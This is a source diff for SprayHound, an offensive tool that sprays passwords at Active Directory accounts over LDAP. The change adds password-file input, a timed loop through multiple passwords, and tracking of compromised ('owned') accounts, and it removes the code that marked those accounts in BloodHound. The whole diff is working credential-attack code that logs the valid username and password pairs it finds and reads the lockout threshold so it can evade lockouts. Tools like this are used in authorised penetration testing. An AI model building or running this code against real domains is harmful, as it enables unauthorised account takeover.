@@ -9,10 +9,11 @@ from sprayhound.modules.ldapconnection import LdapConnection
 from sprayhound.modules.neo4jconnection import Neo4jConnection
 from sprayhound.modules.credential import Credential
 from sprayhound.utils.utils import *
+import time
 
 
 class SprayHound:
-    def __init__(self, users, password, threshold,
+    def __init__(self, users, passwords, threshold, looptime,
                  ldap_options,
                  neo4j_options,
                  logger_options=Logger.Options(),
@@ -24,9 +25,11 @@ class SprayHound:
         self.neo4j = None
         self.credentials = []
         self.users = users
-        self.password = password
+        self.passwords = passwords
         self.threshold = threshold
         self.unsafe = unsafe
+        self.looptime = looptime
+        self.owned = []
 
     def run(self):
         if not self.ldap.domain:
@@ -67,17 +70,22 @@ class SprayHound:
                 raise
 
         try:
-            return self.test_credentials()
+            counter = 0
+            passwords_count = len(self.credentials[0].passwords)
+            while len(self.owned) != len(self.credentials) and counter < passwords_count:
+                self.test_credentials()
+                counter += 1
+                time.sleep(self.looptime)
         except:
             raise
 
     def get_credentials(self):
         self.credentials = [Credential(user) for user in self.users]
         for i in range(len(self.credentials)):
-            if self.password:
-                self.credentials[i].password = self.password
+            if self.passwords:
+                self.credentials[i].passwords = self.passwords.copy()
             else:
-                self.credentials[i].password = self.credentials[i].samaccountname
+                self.credentials[i].passwords = [self.credentials[i].samaccountname]
 
     def get_ldap_credentials(self):
         if not self.users:
@@ -90,16 +98,14 @@ class SprayHound:
                 return ret
 
         for i in range(len(self.credentials)):
-            if self.password:
-                self.credentials[i].set_password(self.password)
+            if self.passwords:
+                self.credentials[i].set_password(self.passwords.copy())
             else:
-                self.credentials[i].set_password(self.credentials[i].samaccountname)
+                self.credentials[i].set_password([self.credentials[i].samaccountname])
 
         return ERROR_SUCCESS
 
     def test_credentials(self):
-        owned = []
-
         testing_nb = len([c.is_tested(self.threshold, self.unsafe) for c in self.credentials if c.is_tested(self.threshold, self.unsafe)[0]])
 
         self.log.success(Logger.colorize("{} users will be tested".format(testing_nb), Logger.GREEN))
@@ -110,45 +116,21 @@ class SprayHound:
             return ERROR_SUCCESS
 
         for credential in self.credentials:
+            if credential.samaccountname in self.owned:
+                continue
             ret = credential.is_valid(self.ldap, self.threshold, self.unsafe)
             if ret == ERROR_SUCCESS:
-                self.log.success("[  {}  ] {}".format(Logger.colorize("VALID", Logger.GREEN), Logger.highlight("{} : {}").format(credential.samaccountname, credential.password)))
-                owned.append(credential.samaccountname)
+                self.log.success("[  {}  ] {}".format(Logger.colorize("VALID", Logger.GREEN), Logger.highlight("{} : {}").format(credential.samaccountname, credential.passwords[0])))
+                self.owned.append(credential.samaccountname)
             elif ret == ERROR_LDAP_SERVICE_UNAVAILABLE:
                 return ret
             elif ret == ERROR_THRESHOLD:
-                self.log.debug("[ {} ] {} : {} BadPwdCount: {}, PwdPol: {}".format(Logger.colorize("SKIPPED", Logger.BLUE), credential.samaccountname, credential.password, credential.bad_password_count+1, credential.threshold))
+                self.log.debug("[ {} ] {} : {} BadPwdCount: {}, PwdPol: {}".format(Logger.colorize("SKIPPED", Logger.BLUE), credential.samaccountname, credential.passwords[0], credential.bad_password_count+1, credential.threshold))
             elif ret == ERROR_LDAP_CREDENTIALS:
-                self.log.debug("[{}] {} : {} failed - BadPwdCount: {}, PwdPol: {}".format(Logger.colorize("NOT VALID", Logger.RED), credential.samaccountname, credential.password, credential.bad_password_count+1, credential.threshold))
+                tested_password = credential.passwords.pop(0)
+                self.log.debug("[{}] {} : {} failed - BadPwdCount: {}, PwdPol: {}".format(Logger.colorize("NOT VALID", Logger.RED), credential.samaccountname, tested_password, credential.bad_password_count+1, credential.threshold))
             else:
-                self.log.debug("{} : {} failed - BadPwdCount: {}, PwdPol: {} (Error {}: {})".format(credential.samaccountname, credential.password, credential.bad_password_count+1, credential.threshold, ret[0], ret[1]))
-
-
-        answer = "n"
-        if len(owned) > 1:
-            self.log.success("{} user(s) have been owned !".format(len(owned)))
-            answer = self.log.input("Do you want to set them as 'owned' in Bloodhound ?", ['y', 'n'], 'y')
-        elif len(owned) > 0:
-            self.log.success("{} user has been owned !".format(len(owned)))
-            answer = self.log.input("Do you want to set it as 'owned' in Bloodhound ?", ['y', 'n'], 'y')
-
-        if answer != "y":
-            self.log.warn("Ok, master. Bye.")
-            return ERROR_SUCCESS
-
-        self.neo4j = Neo4jConnection(self.neo4j_options)
-
-        for own in owned:
-            ret = self.neo4j.set_as_owned(own, self.ldap.domain)
-            if ret == ERROR_SUCCESS:
-                msg = "Node {} owned!".format(own)
-                if self.neo4j.bloodhound_analysis(own, self.ldap.domain) == ERROR_SUCCESS:
-                    msg += " [{}PATH TO DA{}]".format('\033[91m', '\033[0m')
-                self.log.success(msg)
-            elif ret == ERROR_NEO4J_NON_EXISTENT_NODE:
-                self.log.warn("Node {} does not exist".format(own))
-            else:
-                return ret
+                self.log.debug("{} : {} failed - BadPwdCount: {}, PwdPol: {} (Error {}: {})".format(credential.samaccountname, credential.passwords[0], credential.bad_password_count+1, credential.threshold, ret[0], ret[1]))
 
         return ERROR_SUCCESS
 
@@ -185,13 +167,21 @@ class CLI:
                 sprayhound_exit(self.log, ERROR_USER_FILE_NOT_FOUND)
             with open(self.args.userfile, 'r') as f:
                 self.users = [user.strip().lower() for user in f if user.strip() != ""]
-        self.password = self.args.password
+
+        if self.args.password:
+            self.passwords = [self.args.password]
+        elif self.args.passwordfile:
+            if not os.path.isfile(self.args.passwordfile):
+                sprayhound_exit(self.log, ERROR_PASS_FILE_NOT_FOUND)
+            with open(self.args.passwordfile, 'r') as f:
+                self.passwords = [password.strip() for password in f if password.strip() != ""]
         self.threshold = self.args.threshold
+        self.looptime = self.args.loop_time
 
     def run(self):
         try:
             return SprayHound(
-                self.users, self.password, self.threshold,
+                self.users, self.passwords, self.threshold, self.looptime,
                 ldap_options=self.ldap_options,
                 neo4j_options=self.neo4j_options,
                 logger_options=self.log_options,
